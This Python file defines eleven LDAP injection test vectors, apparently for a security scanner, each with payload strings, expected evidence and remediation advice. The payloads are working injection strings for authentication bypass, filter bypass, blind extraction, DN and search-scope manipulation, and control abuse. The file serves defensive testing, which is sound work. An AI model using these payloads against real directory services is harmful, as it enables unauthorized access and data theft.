"""
LDAP Injection Testing Vectors
"""

from ..models import (
    TestVector,
    VulnerabilityType,
    TestVectorPosition as Position,
    PositionType,
    TestVectorPayload as PayloadTemplate,
    TestVectorEvidence as Evidence,
    ConfidenceLevel,
    SensitivityLevel,
)

LDAP_TEST_VECTORS = [
    TestVector(
        id="ldap-injection-001",
        name="LDAP Authentication Bypass",
        description="Tests for LDAP filter injection in authentication",
        vuln_type=VulnerabilityType.LDAP_INJECTION,
        position=Position(
            type=PositionType.BODY_JSON, name="username", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="admin)(&)",
            variants=["admin)(&)", "*)(uid=*))(|(uid=*", "admin)(|(password=*))", "*"],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=["Authentication bypass", "LDAP query manipulation"],
            confidence=ConfidenceLevel.CRITICAL,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Use parameterized LDAP queries. Escape special characters.",
        references=["https://cwe.mitre.org/data/definitions/90.html"],
        tags=["ldap", "injection", "authentication-bypass"],
    ),
    TestVector(
        id="ldap-injection-002",
        name="LDAP Filter Injection - OR Bypass",
        description="Tests for LDAP OR operator injection to bypass filters",
        vuln_type=VulnerabilityType.LDAP_INJECTION,
        position=Position(
            type=PositionType.BODY_JSON, name="search", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="*)(|(objectClass=*",
            variants=["*)(|(cn=*))", "*)(|(uid=*))", "*)(|(mail=*))", "admin)(|(uid=*)"],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=["All entries returned", "Filter bypass", "Unauthorized data access"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Validate and escape LDAP filter characters. Implement allowlist filtering.",
        references=["https://owasp.org/www-community/attacks/LDAP_Injection"],
        tags=["ldap", "injection", "filter-bypass", "or-operator"],
    ),
    TestVector(
        id="ldap-injection-003",
        name="LDAP Blind Injection - Boolean",
        description="Tests for blind LDAP injection using boolean logic",
        vuln_type=VulnerabilityType.LDAP_INJECTION,
        position=Position(
            type=PositionType.BODY_JSON, name="username", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="admin*",
            variants=["admin)(cn=admin*", "admin)(cn=admi*", "admin)(cn=a*", "admin*)(uid=admin*"],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Different response for valid vs invalid",
                "Data enumeration",
                "Character-by-character extraction",
            ],
            confidence=ConfidenceLevel.MEDIUM,
        ),
        sensitivity=SensitivityLevel.MEDIUM,
        remediation="Implement consistent error responses. Use parameterized queries. Add rate limiting.",
        references=[
            "https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html"
        ],
        tags=["ldap", "injection", "blind-injection", "boolean-based"],
    ),
    TestVector(
        id="ldap-injection-004",
        name="LDAP DN Injection",
        description="Tests for Distinguished Name injection in LDAP operations",
        vuln_type=VulnerabilityType.LDAP_INJECTION,
        position=Position(type=PositionType.BODY_JSON, name="dn", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="cn=user,dc=example,dc=com",
            variants=[
                "cn=admin,dc=example,dc=com",
                "../cn=admin,dc=example,dc=com",
                "cn=user+cn=admin,dc=example,dc=com",
                "cn=user,ou=admins,dc=example,dc=com",
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=["DN manipulation", "Privilege escalation", "Unauthorized scope access"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Validate DN format. Restrict DN base scope. Use proper access controls.",
        references=["https://cwe.mitre.org/data/definitions/90.html"],
        tags=["ldap", "injection", "dn-injection"],
    ),
    TestVector(
        id="ldap-injection-005",
        name="LDAP Wildcard Injection",
        description="Tests for wildcard character abuse in LDAP searches",
        vuln_type=VulnerabilityType.LDAP_INJECTION,
        position=Position(
            type=PositionType.BODY_JSON, name="filter", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="*",
            variants=["**", "*)(objectClass=*", "*)(&(objectClass=*", "*)(cn=*)(mail=*"],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=["All entries returned", "Directory enumeration", "Performance degradation"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.MEDIUM,
        remediation="Restrict wildcard searches. Implement query complexity limits. Add pagination.",
        references=["https://owasp.org/www-community/attacks/LDAP_Injection"],
        tags=["ldap", "injection", "wildcard", "enumeration"],
    ),
    TestVector(
        id="ldap-injection-006",
        name="LDAP Parenthesis Balancing Bypass",
        description="Tests for filter injection via unbalanced parentheses",
        vuln_type=VulnerabilityType.LDAP_INJECTION,
        position=Position(
            type=PositionType.BODY_JSON, name="username", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="admin))(&(uid=admin",
            variants=[
                "admin))((uid=*",
                "admin)))",
                "admin))(|(uid=*))(uid=admin",
                "admin)))((((uid=*",
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=["Filter syntax error", "Unexpected results", "Query bypass"],
            confidence=ConfidenceLevel.MEDIUM,
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Validate filter syntax. Use LDAP query builders. Escape parentheses properly.",
        references=[
            "https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html"
        ],
        tags=["ldap", "injection", "parenthesis-bypass"],
    ),
    TestVector(
        id="ldap-injection-007",
        name="LDAP Unicode Character Injection",
        description="Tests for injection using Unicode and special characters",
        vuln_type=VulnerabilityType.LDAP_INJECTION,
        position=Position(type=PositionType.BODY_JSON, name="cn", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="admin\\00",
            variants=["admin\\0d\\0a", "admin\\u0000", "admin\\20\\2a", "admin\\5c2a"],
            encoding="unicode",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Filter bypass via encoding",
                "Null byte truncation",
                "Special character processing",
            ],
            confidence=ConfidenceLevel.MEDIUM,
        ),
        sensitivity=SensitivityLevel.MEDIUM,
        remediation="Normalize Unicode input. Escape special characters. Validate encoding.",
        references=["https://cwe.mitre.org/data/definitions/90.html"],
        tags=["ldap", "injection", "unicode", "encoding"],
    ),
    TestVector(
        id="ldap-injection-008",
        name="LDAP Attribute Injection",
        description="Tests for injection in LDAP attribute names and values",
        vuln_type=VulnerabilityType.LDAP_INJECTION,
        position=Position(
            type=PositionType.BODY_JSON, name="attribute", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="userPassword",
            variants=[
                "userPassword)(objectClass=*",
                "cn=admin,dc=example,dc=com",
                "*",
                "objectClass",
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Sensitive attribute disclosure",
                "Schema enumeration",
                "Privilege escalation",
            ],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Restrict attribute access. Use attribute allowlists. Implement field-level security.",
        references=["https://owasp.org/www-community/attacks/LDAP_Injection"],
        tags=["ldap", "injection", "attribute-injection"],
    ),
    TestVector(
        id="ldap-injection-009",
        name="LDAP AND Operator Injection",
        description="Tests for injection using AND operator to refine queries",
        vuln_type=VulnerabilityType.LDAP_INJECTION,
        position=Position(
            type=PositionType.BODY_JSON, name="filter", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="*)(&(objectClass=person",
            variants=[
                "*)(&(uid=*)(cn=*",
                "*)(&(objectClass=*)(uid=admin",
                "*)(&(cn=admin*",
                "user)(&(objectClass=*",
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=["Modified query logic", "Filter combination", "Data access manipulation"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Parse and validate LDAP filters. Use prepared LDAP operations. Escape operators.",
        references=[
            "https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html"
        ],
        tags=["ldap", "injection", "and-operator"],
    ),
    TestVector(
        id="ldap-injection-010",
        name="LDAP Search Scope Manipulation",
        description="Tests for injection to manipulate LDAP search scope",
        vuln_type=VulnerabilityType.LDAP_INJECTION,
        position=Position(
            type=PositionType.BODY_JSON, name="base_dn", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="ou=users,dc=example,dc=com",
            variants=[
                "dc=example,dc=com",
                "ou=admins,dc=example,dc=com",
                "../dc=example,dc=com",
                "cn=admin,ou=special,dc=example,dc=com",
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=["Scope escalation", "Cross-OU access", "Directory traversal"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Enforce fixed base DN. Validate scope boundaries. Implement access controls per OU.",
        references=["https://cwe.mitre.org/data/definitions/90.html"],
        tags=["ldap", "injection", "scope-manipulation"],
    ),
    TestVector(
        id="ldap-ext-001",
        name="LDAP Extended Controls Manipulation",
        description="Tests for manipulation of LDAP extended controls",
        vuln_type=VulnerabilityType.LDAP_INJECTION,
        position=Position(
            type=PositionType.BODY_JSON, name="controls", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base='{"control": "1.2.840.113556.1.4.417", "criticality": true}',
            variants=[
                '{"control": "1.2.840.113556.1.4.417", "criticality": true}',
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=["Show deleted objects", "Access hidden entries", "Control abuse"],
            confidence=ConfidenceLevel.MEDIUM,
        ),
        sensitivity=SensitivityLevel.MEDIUM,
        remediation="Validate and restrict LDAP controls. Implement control allowlist.",
        references=["https://ldap.com/ldap-extended-operations-and-controls/"],
        tags=["ldap", "extended-controls", "privilege-escalation"],
    ),
]

# Total vectors: 11
